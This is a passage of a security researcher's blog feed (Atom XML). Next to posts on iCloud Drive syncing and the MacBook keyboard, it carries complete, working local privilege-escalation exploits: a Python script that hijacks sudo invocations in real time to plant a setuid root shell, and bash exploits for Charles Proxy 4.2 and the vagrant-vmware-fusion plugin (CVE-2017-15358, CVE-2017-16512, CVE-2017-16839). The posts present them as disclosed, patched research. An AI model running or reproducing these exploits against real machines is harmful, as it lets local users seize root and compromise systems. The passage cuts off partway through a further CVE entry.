+bird    1609 admin   26r      REG                1,4    2488512 3015530 /Users/admin/Library/Caches/com.apple.bird/unlink/211B4D60-AB4C-416B-B0B2-0951D64A4CB7/db/server.db-wal
+bird    1609 admin   27r      REG                1,4       4096 3082856 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db
+bird    1609 admin   28r      REG                1,4    4853392 3082864 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db-wal
+bird    1609 admin   29r      DIR                1,4        832       2 /
+bird    1609 admin   30r      REG                1,4    4095312 3082859 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db-wal
+bird    1609 admin   31r      REG                1,4       4096 3082861 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db
+bird    1609 admin   32r      REG                1,4       4096 3082856 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db
+bird    1609 admin   33r      REG                1,4    4853392 3082864 /Users/admin/Library/Application Support/CloudDocs/session/db/client.db-wal
+bird    1609 admin   34r      REG                1,4    4095312 3082859 /Users/admin/Library/Application Support/CloudDocs/session/db/server.db-wal
+bird    1609 admin   35u      REG                1,4 1658200064 3083092 /Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db
+bird    1609 admin   36u      REG                1,4    4321912 3083095 /Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db-wal
+bird    1609 admin   37u      REG                1,4      65536 3083096 /Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db-shm
+bird    1609 admin   38r      REG                1,4     288952  897141 /Library/Application Support/CrashReporter/SubmitDiagInfo.domains
+
+Interesting. Lots of files that end in .db - databases perhaps? The one most
+obviously associated with cloud docs seemed to be:
+
+/Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db
+
+So I went to that directory and had a look. Sure enough this file is a SQLite
+database. What&amp;#39;s more it was slowing growing in size. So the obvious inference
+is that this is some kind of metadata database that is being actively synced by
+the system. Presumably when this is done the files themselves could be synced.
+
+And that turned out to be the case. Eventually it finished syncing its metadata
+and the files themselves started appearing. So there wasn&amp;#39;t actually any
+problem, but within the first minute of my call with Apple Support they agreed
+with me that there *was* a problem and would no doubt have wasted hours of my
+time trying to fix something that wasn&amp;#39;t actually broken.
+
+I haven&amp;#39;t dug too deeply into how the syncing process works but I have a theory
+about why it stalled for so long in my case. I had some git repos in my iCloud
+Drive that had a *lot* of files in them. One of them had over 77k files. The way
+the SQLite database was growing and the corresponding log messages being
+reported by the bird process lead me to think that it was syncing records in the
+database one by one or in batches, rather than simply downloading a snapshot of
+it. This is presumably slow because the number of API requests is a factor of
+the number of files for which it has to hold metadata. Somebody with a huge
+number of files in their iCloud Drive would presumably experience this taking
+even longer than I did, especially if they didn&amp;#39;t have a particularly fast
+internet connection.
+
+Why Apple chose to make this process invisible in the UI is a mystery. Their
+discussion forums are full of people baffled by this. They must have had endless
+support calls and genius bar visits in relation to it, and in many of those
+cases there may have been nothing actually wrong. The only issue was that the UI
+gives no indication of what it&amp;#39;s doing so the user thinks it isn&amp;#39;t doing
+anything
+
+This is bad design.&lt;/pre&gt;</summary>
+    <title>The real reason your iCloud Drive isn't syncing</title>
+    <updated>2019-07-09T18:34:11+01:00</updated>
+    <dc:date>2019-07-09T18:34:11+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/hijacking-sudo-in-real-time.html</id>
+    <link href="http://m4.rkw.io/blog/hijacking-sudo-in-real-time.html"/>
+    <summary>&lt;pre&gt;A while ago I posted about how sudo can be easily backdoored by dropping a fake
+sudo script into the user&amp;#39;s PATH:
+
+&lt;a href=&quot;https://m4.rkw.io/blog/getting-root-without-an-exploit--stealth-sudo-backdoor.html&quot;&gt;https://m4.rkw.io/blog/getting-root-without-an-exploit--stealth-sudo-backdoor...&lt;/a&gt;
+
+Another attack vector for sudo is monitoring the process list for invocations of
+sudo where the user is being prompted for their sudo password and the target
+script/binary is user-writable. If a rogue process can determine this scenario
+they have a narrow window in which the target script/binary can be replaced with
+something else in order to steal root privileges.
+
+The proof of concept below demonstrates how this can be done, and includes a
+simple shell wrapper that forwards the sudo execution on to a copy of the
+original script so the user likely won&amp;#39;t notice anything.
+
+&lt;a href=&quot;https://m4.rkw.io/sudo_steal.py.txt&quot;&gt;https://m4.rkw.io/sudo_steal.py.txt&lt;/a&gt;
+0d5bb04be60acf3ebb7a7f16932ebd8b8f75636ede85e4e5bcf1f08fbe5e25da
+-------------------------------------------------------------------------------
+#!/usr/bin/env python2.7
+#
+# sudo hijack PoC by m4rkw
+#
+# test on macos and linux
+#
+# run this in one terminal window, then open another and execute something with
+# sudo that you have write access to.
+#
+# in the time it takes you to enter your sudo password, sudo_steal.py will hijack
+# the target in order to steal a root shell, and then pass the execution chain
+# on to a copy of the script so the user running sudo won&amp;#39;t know anything is amis.
+
+import os
+import sys
+import time
+
+
+# we can only hijack sudo if the target command/script is writable
+
+def is_writable(path):
+  try:
+    with open(path,&amp;#39;a+&amp;#39;) as f:
+      pass
+    return True
+  except:
+    pass
+
+  return False
+
+
+# most user-owned stuff executed with sudo will be at a relative path so we
+# need to recursively search for it as quickly as possible.
+#
+# we only have the time it takes the user to enter their password to find
+# the target and hijack it, so this needs to be as fast as possible. this
+# should be quick enough on most mac or linux systems, but if you have a
+# bunch of directories with lots of files it may be too slow.
+
+def fast_find_file(filename):
+  matches = []
+
+  h = os.environ[&amp;#39;HOME&amp;#39;]
+
+  home_path = &amp;quot;%s/%s&amp;quot; % (h, filename)
+
+  if os.path.exists(home_path) and is_writable(home_path):
+    matches.append(home_path)
+
+  dirs = []
+
+  for x in os.popen(&amp;quot;ls -a1 %s&amp;quot; % (h)).read().rstrip().split(&amp;quot;\n&amp;quot;):
+    if os.path.isdir(&amp;quot;%s/%s&amp;quot; % (h, x)) and not os.path.islink(&amp;quot;%s/%s&amp;quot; % (h, x)):
+      if x not in [
+          &amp;#39;.&amp;#39;, &amp;#39;..&amp;#39;,
+          &amp;#39;Library&amp;#39;,
+          &amp;#39;Music&amp;#39;,
+          &amp;#39;Pictures&amp;#39;,
+          &amp;#39;Documents&amp;#39;,
+          &amp;#39;Movies&amp;#39;,
+          &amp;#39;VirtualBox VMs&amp;#39;,
+          &amp;#39;.cups&amp;#39;,
+          &amp;#39;.vagrant.d&amp;#39;,
+          &amp;#39;.ansible&amp;#39;
+        ]:
+        dirs.append(&amp;quot;%s/%s&amp;quot; % (h, x))
+
+  cmd = &amp;quot;find %s -type f -name %s 2&amp;gt;/dev/null&amp;quot; % (&amp;quot; &amp;quot;.join(dirs), filename)
+
+  for x in os.popen(cmd).read().rstrip().split(&amp;quot;\n&amp;quot;):
+    if os.path.exists(x) and is_writable(x):
+      matches.append(x)
+
+  if len(matches) == 0:
+    return False
+
+  return matches
+
+
+# generate a temporary filename to move the hijacked script to
+
+def get_target(match):
+  target = match + &amp;#39;x&amp;#39;
+
+  while os.path.exists(target):
+    target += &amp;#39;x&amp;#39;
+
+  return target
+
+
+# check if the process is still alive
+
+def alive(pid):
+  return os.system(&amp;quot;ps %s 1&amp;gt;/dev/null&amp;quot; % (pid)) == 0
+
+
+# we have a list of paths that may be the target, so hijack and redirect
+# them all
+
+def exploit(pid, matches):
+  remap = {}
+  remapped = []
+
+  for match in matches:
+    remap[match] = get_target(match)
+
+    print &amp;quot;hijacking %s...&amp;quot; % (match)
+
+    try:
+      # move the target out of the way and drop in a bash redirect script
+      # that sets 0:0 and +s on our rootshell payload
+      os.rename(match, remap[match])
+      with open(match,&amp;#39;w&amp;#39;) as f:
+        f.write(&amp;quot;#!/bin/bash\n&amp;quot;)
+        f.write(&amp;quot;chown 0:0 /tmp/.,\n&amp;quot;)
+        f.write(&amp;quot;chmod 4755 /tmp/.,\n&amp;quot;)
+        f.write(&amp;quot;%s $@\n&amp;quot; % (remap[match]))
+      os.chmod(match, 0755)
+      remapped.append(match)
+    except:
+      pass
+
+  if len(remapped) == 0:
+    print &amp;quot;hijack failed.&amp;quot;
+    return
+
+  success = False
+  while True:
+    if os.stat(&amp;quot;/tmp/.,&amp;quot;).st_uid == 0:
+      success = True
+      break
+
+    if not alive(pid):
+      break
+
+    time.sleep(1)
+
+  # move the hijacked files back into place
+  for match in remapped:
+    os.rename(remap[match], match)
+
+  if success:
+    os.system(&amp;quot;/tmp/.,&amp;quot;)
+    sys.exit(0)
+
+  print &amp;quot;exploit failed.&amp;quot;
+
+
+# simple rootshell payload
+
+with open(&amp;quot;/tmp/.,.c&amp;quot;,&amp;quot;w&amp;quot;) as f:
+  f.write(&amp;quot;#include &amp;lt;unistd.h&amp;gt;\n&amp;quot;)
+  f.write(&amp;quot;int main(){setuid(0);seteuid(0);execl(\&amp;quot;/bin/bash\&amp;quot;,&amp;quot;)
+  f.write(&amp;quot;\&amp;quot;bash\&amp;quot;,\&amp;quot;-c\&amp;quot;,\&amp;quot;rm -f /tmp/.,; /bin/bash\&amp;quot;,NULL);&amp;quot;)
+  f.write(&amp;quot;return 0;}\n&amp;quot;)
+
+os.system(&amp;quot;gcc -o /tmp/., /tmp/.,.c; rm -f /tmp/.,.c&amp;quot;)
+
+
+# continuously scan for hijackable processes
+
+while True:
+  ps_lines = os.popen(&amp;quot;ps -a -o pid= -o ppid= -o command= |xargs -L1&amp;quot;).read().rstrip().split(&amp;quot;\n&amp;quot;)
+
+  children = {}
+
+  # build a map of children so we can avoid trying to hijack sudo
+  # processes that have children (i.e. already authenticated)
+
+  for line in ps_lines:
+    seg = line.split(&amp;#39; &amp;#39;)
+    pid = seg[0]
+    ppid = seg[1]
+
+    if not ppid in children.keys():
+      children[ppid] = []
+
+    children[ppid].append(pid)
+
+  # look for invocations of sudo that have prompted the user for their password
+  # and where the target binary/script is user-writable
+
+  for line in ps_lines:
+    seg = line.split(&amp;#39; &amp;#39;)
+
+    if seg[2] == &amp;#39;sudo&amp;#39;:
+      print &amp;quot;potential target: %s&amp;quot; % (line)
+
+      pid = seg[0]
+
+      # if sudo has child processes then it&amp;#39;s already authenticated
+      if pid in children.keys():
+        print &amp;quot;%s has children, skipping&amp;quot; % (pid)
+        continue
+
+      args = seg[3:]
+
+      while True:
+        matches = fast_find_file(&amp;quot; &amp;quot;.join(args))
+
+        if matches:
+          break
+
+        args = args[0:len(args)-1]
+
+        if len(args) == 0:
+          break
+
+      if matches:
+        exploit(pid, matches)
+
+  time.sleep(1)&lt;/pre&gt;</summary>
+    <title>hijacking sudo in real time</title>
+    <updated>2018-08-15T22:03:15+01:00</updated>
+    <dc:date>2018-08-15T22:03:15+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cve201715358-local-root-privesc-in-charles-proxy-42.html</id>
+    <link href="http://m4.rkw.io/blog/cve201715358-local-root-privesc-in-charles-proxy-42.html"/>
+    <summary>&lt;pre&gt;Charles Proxy is a great mac application for debugging web services and
+inspecting SSL traffic for any application on your machine.
+
+In order to inspect the SSL traffic it needs to configure the system to use a
+proxy so that it can capture the packets and use its custom root CA to decode
+the SSL.
+
+Setting a system-wide proxy requires root permissions so this is handled by an
+suid binary located within the Charles application folder:
+
+/Applications/Charles.app/Contents/Resources/Charles Proxy Settings
+
+Unfortunately this binary is vulnerable to a race condition which allows a local
+user to spawn a root shell. It supports a parameter &amp;quot;--self-repair&amp;quot; which it
+uses to re-set the root+suid permissions on itself, with a graphical dialog
+shown to the user. However if this is called when the binary is already
+root+suid then no password dialog is shown.
+
+It doesn&amp;#39;t validate the path to itself and uses a simple API call to get the
+path to the binary at the time it was invoked. This means that between executing
+the binary and reaching the code path where root+suid is set there is enough
+time to replace the path to the binary with an alternate payload which will then
+receive the suid+root permissions instead of the Charles binary.
+
+This issue was fixed in Charles 4.2.1 released in November 2017.
+
+&lt;a href=&quot;https://m4.rkw.io/charles_4.2.sh.txt&quot;&gt;https://m4.rkw.io/charles_4.2.sh.txt&lt;/a&gt;
+2f4a2dca6563d05a201108ec6e9454e2894b603b68b3b70b8f8b043b43ee9284
+-------------------------------------------------------------------------------
+#!/bin/bash
+
+####################################################
+###### Charles 4.2 local root privesc exploit ######
+###### by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html&quot;&gt;https://m4.rkw.io/blog.html&lt;/a&gt; ######
+####################################################
+
+cd
+user=&amp;quot;`whoami`&amp;quot;
+
+cat &amp;gt; charles_exploit.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(&amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f \&amp;quot;/Users/$user/Charles Proxy Settings\&amp;quot;; /bin/bash&amp;quot;,NULL);
+  return 0;
+}
+EOF
+
+gcc -o charles_exploit charles_exploit.c
+if [ $? -ne 0 ] ; then
+  echo &amp;quot;failed to compile the exploit, you need xcode cli tools for this.&amp;quot;
+  exit 1
+fi
+rm -f charles_exploit.c
+
+ln -s /Applications/Charles.app/Contents/Resources/Charles\ Proxy\ Settings
+./Charles\ Proxy\ Settings --self-repair 2&amp;gt;/dev/null &amp;amp;
+rm -f ./Charles\ Proxy\ Settings
+mv charles_exploit Charles\ Proxy\ Settings
+
+i=0
+
+while :
+do
+  r=`ls -la Charles\ Proxy\ Settings |grep root`
+  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    break
+  fi
+  sleep 0.1
+  i=$((i+1))
+  if [ $i -eq 10 ] ; then
+    rm -f Charles\ Proxy\ Settings
+    echo &amp;quot;Not vulnerable&amp;quot;
+    exit 1
+  fi
+done
+
+./Charles\ Proxy\ Settings&lt;/pre&gt;</summary>
+    <title>CVE-2017-15358 Local root privesc in Charles Proxy 4.2</title>
+    <updated>2018-07-30T06:41:01+01:00</updated>
+    <dc:date>2018-07-30T06:41:01+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/201617-macbook-pro-keyboard-recall.html</id>
+    <link href="http://m4.rkw.io/blog/201617-macbook-pro-keyboard-recall.html"/>
+    <summary>&lt;pre&gt;Somebody started a petition asking Apple to recall the 2016 (and presumably
+2017 since they&amp;#39;re basically the same) macbook pros and fit them with a
+keyboard &amp;quot;that works&amp;quot;:
+
+&lt;a href=&quot;https://www.change.org/p/apple-apple-recall-macbook-pro-w-defective-keyboard-replace-with-different-working-keyboard&quot;&gt;https://www.change.org/p/apple-apple-recall-macbook-pro-w-defective-keyboard-...&lt;/a&gt;
+
+This is a rather absurd proposition.
+
+I have a 2016 macbook pro escape and I&amp;#39;m currently on my 4th topcase because of
+keyboard &amp;quot;failures&amp;quot; so if anyone should be calling for this it would be me.
+
+However, I strongly suspect the machine didn&amp;#39;t actually need a keyboard
+replacement at all. Let me explain.
+
+The first problem I had was a spongey key that wouldn&amp;#39;t register when pressed. I
+took it to the Apple store and one of their &amp;quot;geniuses&amp;quot; immediately diagnosed it
+as a keyboard failure and booked it in for repair. No air duster was tried and I
+didn&amp;#39;t know about air dusting at the time so I just went along with it.
+
+A total of three keyboard replacements and lots of media coverage later and now
+I know more about this issue and have invested in a can of air duster. Apple
+also now has a support page explaining how to clean the keyboard with an air
+duster:
+
+&lt;a href=&quot;https://support.apple.com/en-us/HT205662&quot;&gt;https://support.apple.com/en-us/HT205662&lt;/a&gt;
+
+I&amp;#39;ve since had a number of similar issues with various keys that were immediately
+solved with the air duster.
+
+So I think the real issue here is that Apple&amp;#39;s in-store technicians were simply
+not adequately prepared for these scenarios, possibly because Apple didn&amp;#39;t
+encounter this during testing or perhaps because it happened so infrequently
+that they just didn&amp;#39;t think it was an issue.
+
+Although at first I wasn&amp;#39;t keen I now actually quite like typing on the
+butterfly keyboard and having to keep an air duster handy isn&amp;#39;t really much of
+an inconvenience for me.
+
+I can understand why people might try to demand that apple recall this product
+and &amp;quot;fix the keyboard&amp;quot; but you need only pause for a brief moment to realise
+how absurd this idea is.
+
+For a start Apple takes *years* to develop every single one of their products.
+Even if they did issue a recall today it would take months at the very best
+and much more likely years for there to even be a chance of having a &amp;quot;fixed&amp;quot;
+keyboard. When car manufacturers issue a recall they typically have a fixed
+version of the design ready to go, that&amp;#39;s clearly not the case here and in my
+opinion not likely to ever be the case.
+
+Any replacement keyboard part would have to be compatible with the existing
+chassis design so it couldn&amp;#39;t be anything other than a low-travel keyboard.
+I think the nature of a low-travel keyboard with moving keys being used in
+an environment where dust may be present is not something that even Apple
+with its mastery of hardware design can fully solve.
+
+Just get an air duster, it&amp;#39;s really not that big a deal.&lt;/pre&gt;</summary>
+    <title>2016-17 Macbook Pro keyboard recall</title>
+    <updated>2018-05-04T07:38:07+01:00</updated>
+    <dc:date>2018-05-04T07:38:07+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cve201716512-hashicorp-vagrantvmwarefusion-v502504-local-root.html</id>
+    <link href="http://m4.rkw.io/blog/cve201716512-hashicorp-vagrantvmwarefusion-v502504-local-root.html"/>
+    <summary>&lt;pre&gt;Another Hashicorp bug that I&amp;#39;ve been sitting on since late last year. This one
+was exploitable only during the vagrant update process, or even if the user
+typed &amp;quot;vagrant plugin update&amp;quot; and there was no pending update.
+
+It was possible for a rogue process on the system to subvert the upgrade process
+in a way the user was unlikely to notice in order to steal root privileges.
+
+This is now fixed.
+
+&lt;a href=&quot;https://m4.rkw.io/vagrant_vmware_privesc_5.0.2-5.0.4.sh.txt&quot;&gt;https://m4.rkw.io/vagrant_vmware_privesc_5.0.2-5.0.4.sh.txt&lt;/a&gt;
+3efa119a3f20c852ffe64ec2d3dd81ef1186560aaf1b847b1d573e062195202f
+--------------------------------------------------------------------------------
+#!/bin/bash
+echo &amp;quot;##############################################&amp;quot;
+echo &amp;quot;vagrant_vmware_fusion 5.0.2-5.0.4 root privesc&amp;quot;
+echo &amp;quot;by m4rkw&amp;quot;
+echo &amp;quot;##############################################&amp;quot;
+echo
+
+ruby_version=`ls ~/.vagrant.d/gems/ |xargs`
+plugin_version=`ls ~/.vagrant.d/gems/*/gems/ |grep vagrant-vmware-fusion |cut -d &amp;#39;-&amp;#39; -f4`
+
+echo &amp;quot;compiling...&amp;quot;
+
+cat &amp;gt; vvf.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+int main(int ac, char *av[])
+{
+  setuid(0);
+  seteuid(0);
+  if (ac &amp;gt; 1) {
+    system(&amp;quot;mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 /tmp/vvf_exp&amp;quot;);
+    system(&amp;quot;chown root:wheel /tmp/vvf_exp&amp;quot;);
+    system(&amp;quot;chmod 4755 /tmp/vvf_exp&amp;quot;);
+    system(&amp;quot;mv -f $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64.orig $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64&amp;quot;);
+    system(&amp;quot;$HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 install\012&amp;quot;);
+    return 0;
+  }
+  system(&amp;quot;rm -f /tmp/vvf_exp&amp;quot;);
+  execl(&amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,NULL);
+  return 0;
+}
+EOF
+
+gcc -o /tmp/vvf_exp vvf.c
+rm -f vvf.c
+
+echo &amp;quot;waiting for user to initiate vagrant plugin update...&amp;quot;
+
+while :
+do
+  r=`ps auxwww |grep &amp;#39;/usr/bin/sudo&amp;#39; |grep &amp;#39;vagrant-vmware-installer_darwin_amd64 install&amp;#39; |grep -v grep`
+  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    break
+  fi
+done
+
+pid=`ps auxww |grep &amp;#39;./vagrant-vmware-installer_darwin_amd64 install&amp;#39; |grep -v grep |xargs -L1 |cut -d &amp;#39; &amp;#39; -f2`
+
+cd $HOME/.vagrant.d/gems/$ruby_version/gems/vagrant-vmware-fusion-$plugin_version/ext/vagrant-vmware-desktop
+
+echo &amp;quot;dropping payload in place of installer binary...&amp;quot;
+
+mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
+mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64
+
+echo &amp;quot;waiting for payload to trigger...&amp;quot;
+
+while :
+do
+  r=`ls -la /tmp/vvf_exp 2&amp;gt;/dev/null |grep -- &amp;#39;-rwsr-xr-x&amp;#39; |grep root`
+  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    echo &amp;quot;spawning shell...&amp;quot;
+    /tmp/vvf_exp
+    exit 0
+  fi
+done&lt;/pre&gt;</summary>
+    <title>CVE-2017-16512 Hashicorp vagrant-vmware-fusion v5.0.2-5.0.4 local root</title>
+    <updated>2018-03-28T21:08:28+01:00</updated>
+    <dc:date>2018-03-28T21:08:28+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cve201716839-hashicorp-vagrantvmwarefusion-v504-local-root.html</id>
+    <link href="http://m4.rkw.io/blog/cve201716839-hashicorp-vagrantvmwarefusion-v504-local-root.html"/>
+    <summary>&lt;pre&gt;Another exploit for the now deprecated vagrant-vmware-fusion plugin. This one
+only works if VMware Fusion is not installed which is an unlikely scenario.
+However if this should occur then it&amp;#39;s an easy root escalation so users should
+still update.
+
+&lt;a href=&quot;https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt&quot;&gt;https://m4.rkw.io/vagrant_vmware_privesc_5.0.4.sh.txt&lt;/a&gt;
+92d193047970f90f18913cb8a1fe3b326c750dc68a2bc54be6b16e0d899c294a
+------------------------------------------------------------------------------
+#!/bin/bash
+echo
+echo &amp;quot;#########################################################&amp;quot;
+echo &amp;quot;# vagrant_vmware_fusion plugin 5.0.4 local root privesc #&amp;quot;
+echo &amp;quot;# by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html                #&amp;quot&quot;&gt;https://m4.rkw.io/blog.html                #&amp;quot&lt;/a&gt;;
+echo &amp;quot;#########################################################&amp;quot;
+echo &amp;quot;# Note: only works when VMWare Fusion is not installed. #&amp;quot;
+echo &amp;quot;#########################################################&amp;quot;
+echo
+
+cleanup() {
+  exec 2&amp;gt; /dev/null
+  killall -9 vagrant 1&amp;gt;/dev/null 2&amp;gt;/dev/null
+  kill -9 `ps auxwww |egrep &amp;#39;\/vagrant up$&amp;#39; |xargs -L1 |cut -d &amp;#39; &amp;#39; -f2` &amp;amp;&amp;gt;/dev/null
+  exec 2&amp;gt; /dev/tty
+  cd
+  rm -rf .vagrant_vmware_fusion_504_exp
+  rm -rf /Applications/VMware\ Fusion.app
+  mv -f ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb
+}
+
+if [ -e &amp;quot;/Applications/VMware Fusion.app&amp;quot; ] ; then
+  echo &amp;quot;Fusion is installed, not exploitable.&amp;quot;
+  exit 1
+fi
+
+echo &amp;quot;setting up fake app directory...&amp;quot;
+
+mkdir /Applications/VMware\ Fusion.app
+if [ ! $? -eq 0 ] ; then
+  echo &amp;quot;Failed to create /Applications/VMware Fusion.app.&amp;quot;
+  exit 1
+fi
+
+mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services
+
+touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+
+cat &amp;gt; /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx &amp;lt;&amp;lt;EOF
+#!/bin/bash
+echo 1&amp;gt;&amp;amp;2
+echo &amp;quot;VMware Fusion Information:&amp;quot; 1&amp;gt;&amp;amp;2
+echo &amp;quot;VMware Fusion 10.0.1 build-6754183 Release&amp;quot; 1&amp;gt;&amp;amp;2
+echo
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx
+
+cat &amp;gt; /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack &amp;lt;&amp;lt;EOF
+#!/bin/bash
+chown root:wheel /tmp/vvp_504
+chmod 4755 /tmp/vvp_504
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli.hack
+
+echo &amp;quot;compiling payload...&amp;quot;
+
+cat &amp;gt; /tmp/vvp_504.c &amp;lt;&amp;lt;EOF
+#include &amp;lt;unistd.h&amp;gt;
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl(&amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f /tmp/vvp_504; /bin/bash&amp;quot;,NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/vvp_504 /tmp/vvp_504.c
+rm -f /tmp/vvp_504.c
+
+cd
+mkdir .vagrant_vmware_fusion_504_exp
+cd .vagrant_vmware_fusion_504_exp
+
+echo &amp;quot;writing dummy vagrantfile ...&amp;quot;
+
+cat &amp;gt; vagrantfile &amp;lt;&amp;lt;EOF
+Vagrant.configure(&amp;#39;2&amp;#39;) do |config|
+  config.vm.box = &amp;#39;envimation/ubuntu-xenial&amp;#39;
+end
+EOF
+
+echo &amp;quot;patching driver.rb...&amp;quot;
+
+if [ ! -e ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig ] ; then
+  mv ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb.orig
+fi
+
+cat &amp;gt; ~/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/lib/vagrant-vmware-fusion/driver.rb &amp;lt;&amp;lt;EOF
+load File.dirname(__FILE__) + &amp;quot;/driver.rb.orig&amp;quot;
+
+Dir.chdir(&amp;quot;/Applications/VMware Fusion.app/Contents/Library/&amp;quot;)
+
+\`ln -sf /bin/ls vmnet-cli\`
+
+Thread.new do
+  system(&amp;quot;/Users/#{ENV[&amp;quot;USER&amp;quot;]}/.vagrant.d/gems/2.4.2/gems/vagrant-vmware-fusion-5.0.4/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status&amp;quot;)
+end
+
+sleep 1.0/ENV[&amp;quot;DELAY&amp;quot;].to_f
+
+\`ln -sf vmnet-cli.hack vmnet-cli\`
+
+exit 0
+EOF
+
+echo
+echo &amp;quot;attempting to exploit the race condition...&amp;quot;
+echo &amp;quot;(the more loaded the system the longer this will take)&amp;quot;
+echo
+
+echo -n &amp;quot;racing: &amp;quot;
+
+success=0
+i=0
+delay=80
+previous_dir=0
+gap=5
+max_attempts=250
+
+while :
+do
+  export DELAY=&amp;quot;$delay&amp;quot;
+  printf &amp;quot;%x&amp;quot; $DELAY
+
+  x=`vagrant up 2&amp;gt;&amp;amp;1`
+
+  if [ &amp;quot;`echo &amp;quot;$x&amp;quot; |grep &amp;#39;illegal option&amp;#39;`&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    if [ $previous_dir -eq 2 -a $gap -gt 1 ] ; then
+      gap=$((gap-1))
+    fi
+    delay=$((delay+$gap))
+    previous_dir=1
+  elif [ &amp;quot;`echo &amp;quot;$x&amp;quot; |grep &amp;#39;detected invalid ownership&amp;#39;`&amp;quot; != &amp;quot;&amp;quot; ] ; then
+    if [ $previous_dir -eq 1 -a $gap -gt 1 ] ; then
+      gap=$((gap-1))
+    fi
+    delay=$((delay-$gap))
+    previous_dir=2
+  else
+    r=`ls -la /tmp/vvp_504 |grep -- &amp;#39;-rwsr-xr-x  1 root  wheel&amp;#39;`
+    if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
+      success=1
+      break
+    fi
+  fi
+
+  i=$((i+1))
+
+  if [ $i -eq $max_attempts ] ; then
+    break
+  fi
+done
+
+cleanup
+
+if [ ! $success -eq 1 ] ; then
+  echo
+  echo
+  echo &amp;quot;exploit failed.&amp;quot;
+  exit 1
+fi
+
+echo
+echo
+echo &amp;quot;SUCCESS!&amp;quot;
+cd
+/tmp/vvp_504&lt;/pre&gt;</summary>
+    <title>CVE-2017-16839 Hashicorp vagrant-vmware-fusion v5.0.4 local root</title>
+    <updated>2018-03-28T21:03:02+01:00</updated>
+    <dc:date>2018-03-28T21:03:02+01:00</dc:date>
+  </entry>
+  <entry>
+    <id>http://m4.rkw.io/blog/cve201716873-hashicorp-vagrantvmwarefusion-v4025504-local-root.html</id>
+    <link href="http://m4.rkw.io/blog/cve201716873-hashicorp-vagrantvmwarefusion-v4025504-local-root.html"/>
+    <summary>&lt;pre&gt;This issue was reported to Hashicorp on 16/11/17. At first they claimed it was
+low priority because it required local access, despite being a straight-to-root
+escalation. Then they conceded that this wasn&amp;#39;t reasonable and said it was high
+priority and that they would address it.
+
